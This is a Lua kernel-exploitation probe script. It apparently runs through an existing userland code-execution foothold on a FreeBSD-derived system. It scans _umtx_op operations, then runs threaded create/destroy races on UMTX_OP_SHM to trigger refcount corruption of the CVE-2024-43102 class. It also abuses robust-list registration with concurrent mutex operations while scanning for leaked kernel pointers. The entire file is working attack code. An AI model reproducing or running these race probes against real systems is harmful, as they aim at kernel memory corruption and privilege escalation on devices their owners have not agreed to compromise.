-- CRASH_CLASS: HIGH
-- PROBE 142a: UMTX robust futex race + SHM race via Thrd_create
--
-- Context: _umtx_op(454) is reachable (56i2: ops 5/21 ret=0).
-- Thrd_create works (126h: 5 threads confirmed).
-- CVE-2024-43102 class: race UMTX_OP_SHM create/destroy refcount.
--
-- This probe uses the confirmed thread API to run proper kernel races:
-- Phase 1: UMTX op scan on 454 with correct libc Thrd_create threads
-- Phase 2: UMTX_OP_SHM with correct FreeBSD 11 arg layout
-- Phase 3: Threaded SHM create/destroy race for refcount corruption
-- Phase 4: Robust futex list registration + corruption race

print("=== PROBE 142a: UMTX ROBUST RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 142a COMPLETE ===")
    return
end

local thrd_create = fcall(libc_addrofs.Thrd_create)
local thrd_join = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

-- _umtx_op(obj, op, val, uaddr1, uaddr2)
-- sys 454

-- ============================================================
-- PHASE 1: UMTX op scan via native.fcall_with_rax
-- ============================================================
print("")
print("--- PHASE 1: UMTX OP SCAN ---")

local umtx_ops = {
    {0, "LOCK"},
    {1, "UNLOCK"},
    {2, "WAIT"},
    {3, "WAKE"},
    {5, "MUTEX_LOCK"},
    {6, "MUTEX_UNLOCK"},
    {9, "SET_CEILING"},
    {10, "CV_WAIT"},
    {11, "CV_SIGNAL"},
    {12, "CV_BROADCAST"},
    {13, "WAIT_UINT"},
    {14, "RW_RDLOCK"},
    {15, "RW_WRLOCK"},
    {16, "RW_UNLOCK"},
    {17, "WAIT_UINT_PRIVATE"},
    {18, "WAKE_PRIVATE"},
    {19, "MUTEX_WAIT"},
    {20, "MUTEX_WAKE"},
    {21, "SEM_WAIT"},
    {22, "SEM_WAKE"},
    {23, "NWAKE_PRIVATE"},
    {25, "SHM"},
    {26, "ROBUST_LISTS"},
}

local obj = memory.alloc(64)
safe_wq(obj, uint64(0))
local uaddr1 = memory.alloc(64)
safe_wq(uaddr1, uint64(0))
local uaddr2 = memory.alloc(64)
safe_wq(uaddr2, uint64(0))

local working_ops = {}

for _, entry in ipairs(umtx_ops) do
    local op = entry[1]
    local name = entry[2]

    safe_wq(obj, uint64(0))
    safe_wq(uaddr1, uint64(0))
    safe_wq(uaddr2, uint64(0))

    local ok, ret = pcall(function()
        return to_num(native.fcall_with_rax(stub, 454,
            to_num(obj), op, 0, to_num(uaddr1), to_num(uaddr2)))
    end)

    if ok then
        print(string.format("  op %2d %-20s ret=%d", op, name, ret))
        if ret == 0 then
            working_ops[#working_ops + 1] = {op, name}
        end
    else
        print(string.format("  op %2d %-20s CRASH", op, name))
        local alive = pcall(function() return to_num(syscall.getpid()) end)
        if not alive then
            print("*** PROCESS DEAD ***")
            return
        end
    end
end

print("Working ops: " .. #working_ops)
print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: UMTX_OP_SHM (op 25) with FreeBSD 11 layout
-- ============================================================
print("")
print("--- PHASE 2: UMTX_OP_SHM ---")

-- FreeBSD 11: _umtx_op(ignored, 25, flags, key_addr, NULL)
-- flags: 0=LOOKUP, 1=CREATE, 2=DESTROY, 3=ALIVE
local shm_key = memory.alloc(32)
safe_wq(shm_key, uint64(0x1234))

-- Try CREATE
local shm_cr = to_num(native.fcall_with_rax(stub, 454,
    0, 25, 1, to_num(shm_key), 0))
print("SHM CREATE ret=" .. shm_cr)

-- Try LOOKUP
local shm_lu = to_num(native.fcall_with_rax(stub, 454,
    0, 25, 0, to_num(shm_key), 0))
print("SHM LOOKUP ret=" .. shm_lu)

-- Try ALIVE
local shm_al = to_num(native.fcall_with_rax(stub, 454,
    0, 25, 3, to_num(shm_key), 0))
print("SHM ALIVE ret=" .. shm_al)

-- Try DESTROY
local shm_dy = to_num(native.fcall_with_rax(stub, 454,
    0, 25, 2, to_num(shm_key), 0))
print("SHM DESTROY ret=" .. shm_dy)

-- Try alternative layout: _umtx_op(key_addr, 25, flags, NULL, NULL)
safe_wq(shm_key, uint64(0x5678))
local shm_alt = to_num(native.fcall_with_rax(stub, 454,
    to_num(shm_key), 25, 1, 0, 0))
print("SHM alt layout CREATE ret=" .. shm_alt)

local shm_works = (shm_cr == 0 or shm_alt == 0)
print("SHM works: " .. tostring(shm_works))
print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: Threaded SHM race (if SHM works)
-- ============================================================
print("")
print("--- PHASE 3: SHM RACE ---")

if shm_works then
    local RACE_ROUNDS = 200
    local anomalies = 0

    for round = 1, RACE_ROUNDS do
        -- Create a fresh SHM entry
        local key = memory.alloc(32)
        safe_wq(key, uint64(round * 0x100))

        native.fcall_with_rax(stub, 454, 0, 25, 1, to_num(key), 0)

        -- Thread: atomic_add creates scheduling pressure
        local shared = memory.alloc(8)
        safe_wq(shared, uint64(0))
        local thr = memory.alloc(8)
        pcall(thrd_create, thr, atomic_fn, uint64(to_num(shared)))

        -- Main: rapidly create+destroy same key
        for i = 1, 10 do
            native.fcall_with_rax(stub, 454, 0, 25, 2, to_num(key), 0)
            native.fcall_with_rax(stub, 454, 0, 25, 1, to_num(key), 0)
        end

        -- Check: lookup after destroy cycle
        local check = to_num(native.fcall_with_rax(stub, 454, 0, 25, 0, to_num(key), 0))
        if check == 0 then
            -- SHM entry still alive after destroy — potential refcount bug
            anomalies = anomalies + 1
            if anomalies <= 10 then
                print(string.format("  round %d: LOOKUP AFTER DESTROY succeeded (anomaly)", round))
            end
        end

        -- Cleanup
        native.fcall_with_rax(stub, 454, 0, 25, 2, to_num(key), 0)
        pcall(thrd_join, memory.read_qword(thr), uint64(0))

        if round % 50 == 0 then
            local ok = pcall(function() return to_num(syscall.getpid()) end)
            if not ok then
                print("*** CRASH at round " .. round .. " ***")
                return
            end
            print("  progress: " .. round .. "/" .. RACE_ROUNDS .. " anomalies=" .. anomalies)
        end
    end

    print("SHM race anomalies: " .. anomalies)
else
    print("SHM not working — skipping race")
end

-- ============================================================
-- PHASE 4: UMTX_OP_ROBUST_LISTS (op 26)
-- ============================================================
print("")
print("--- PHASE 4: ROBUST LISTS ---")

-- FreeBSD: _umtx_op(NULL, 26, sizeof(robust_list_head), &head, NULL)
-- struct umtx_robust_lists_params { uintptr_t robust_list_offset;
--   uintptr_t robust_inact_offset; uintptr_t robust_list_size; }
local robust_params = memory.alloc(64)
-- Build a fake robust_lists_params
safe_wq(robust_params, uint64(0))        -- robust_list_offset
safe_wq(robust_params + 8, uint64(0))    -- robust_inact_offset
safe_wq(robust_params + 16, uint64(24))  -- size = sizeof(struct)

-- Register robust list
local rb = to_num(native.fcall_with_rax(stub, 454,
    0, 26, 24, to_num(robust_params), 0))
print("ROBUST_LISTS register ret=" .. rb)

if rb == 0 then
    print("*** ROBUST LISTS REGISTERED ***")

    -- Now race: thread corrupts the robust list while main does mutex ops
    local mutex = memory.alloc(64)
    safe_wq(mutex, uint64(0))

    local LOCK_ROUNDS = 100
    local lock_anomalies = 0

    for round = 1, LOCK_ROUNDS do
        safe_wq(mutex, uint64(0))

        -- Thread: atomic_add on the mutex (corrupts owner field)
        local thr = memory.alloc(8)
        pcall(thrd_create, thr, atomic_fn, uint64(to_num(mutex)))

        -- Main: lock and unlock
        local lr = to_num(native.fcall_with_rax(stub, 454,
            to_num(mutex), 5, 0, 0, 0))
        local ur = to_num(native.fcall_with_rax(stub, 454,
            to_num(mutex), 6, 0, 0, 0))

        if lr ~= 0 and lr ~= -1 then
            lock_anomalies = lock_anomalies + 1
            if lock_anomalies <= 5 then
                print(string.format("  round %d: anomalous lock ret=%d", round, lr))
            end
        end

        pcall(thrd_join, memory.read_qword(thr), uint64(0))

        -- Check mutex state for kernel pointers
        local mval = safe_rq(mutex)
        if is_kptr(mval) then
            print(string.format("  *** KPTR in mutex round %d: %s ***", round, fmt_addr(mval)))
        end

        if round % 25 == 0 then
            local ok = pcall(function() return to_num(syscall.getpid()) end)
            if not ok then
                print("*** CRASH at round " .. round .. " ***")
                return
            end
        end
    end

    print("Lock anomalies: " .. lock_anomalies)
end

-- VM counter
local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 142a COMPLETE ===")
